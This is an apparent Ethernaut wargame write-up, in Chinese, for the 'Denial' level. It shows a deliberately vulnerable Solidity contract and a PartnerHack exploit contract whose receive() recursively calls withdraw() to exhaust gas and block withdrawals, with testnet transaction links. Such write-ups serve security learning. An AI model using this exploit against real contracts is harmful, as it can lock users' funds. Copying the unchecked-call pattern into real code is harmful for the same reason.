
# Level 20: Denial

## 1. 问题
需要你阻止用户调用 `withdraw()` 函数来从合约中提款出去。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint256 timeLastWithdrawn;
    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint256 amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value: amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

## 2. 解法

思路：设置 `partner` 的 `receive` 函数，在接受 `eth` 时，递归调用 `Denial.withdraw()`, 从而形成循环调用，直到 gas 超过上限。

```solidity
// SPDX-License-Identifier: MIT 
pragma solidity ^0.8.0;

interface DenialI {
    function setWithdrawPartner(address _partner) external;
    function contractBalance() external view returns (uint256);
    function withdraw() external;
}

contract PartnerHack {
    
    DenialI public denial;
    
    constructor(address _denial) {
        denial = DenialI(_denial);
    }
    
    receive() external payable {
        // 递归循环调用，直到gas超过上限
        denial.withdraw();
    }
}
```

1. [部署 `PartnerHack`](https://sepolia.etherscan.io/tx/0xe591fc9f902411fa7b2ccabe99a620e8b2c2a307942a4274c24c0c233f41d9a8)

2. [设置 `partner` 地址](https://sepolia.etherscan.io/tx/0xe23acde5f24c60986483019796a3aa02e52c1325a44bae630c3b07ef20703d5d)

3. [Submit instance](https://sepolia.etherscan.io/tx/0x845d4a42e5576b7fa10809e422905b55895e27790571c752b9e2f4c65f20efee), 通过！
<br/>
<br/>

| [⬅️ level19 Allen Codex](../level19_allencodex/README.md) | [level22 Shop ➡️](../level22_shop/README.md) |
| :---------------------------------------------------------- | -----------------------------------------------: |
